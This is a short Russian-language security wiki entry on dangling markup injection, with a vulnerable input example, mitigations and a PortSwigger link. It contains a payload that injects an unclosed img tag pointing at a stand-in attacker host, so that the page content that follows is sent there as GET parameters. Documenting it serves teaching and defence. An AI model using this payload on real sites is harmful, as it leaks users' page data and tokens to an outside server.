# \[висячая разметка] Dangling markup injection

## About

Эта техника помогает в ситуациях, когда обычная XSS невозможна из-за фильтров.

## Пример

Пусть мы можем влиять на контент в `<input>`, однако, по какой-то причине XSS не можем встроить - она не отрабатывает (например, из-за CSP):

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

В этом случае мы можем встроить следующий код:

```
"><img src='//attacker-website.com?
```

В этом случае (мы специально не закрываем апостроф), все данные, что попадут между `'` , будут отправлены на наш сервер в виде GET-параметров.

## Mitigation

* Здесь помогут те же меры, что и против  XSS
* Использовать CSP. Например, для ограничений по загрузке ресурсов через тег img.

## Papers

Основная статья: [https://portswigger.net/web-security/cross-site-scripting/dangling-markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
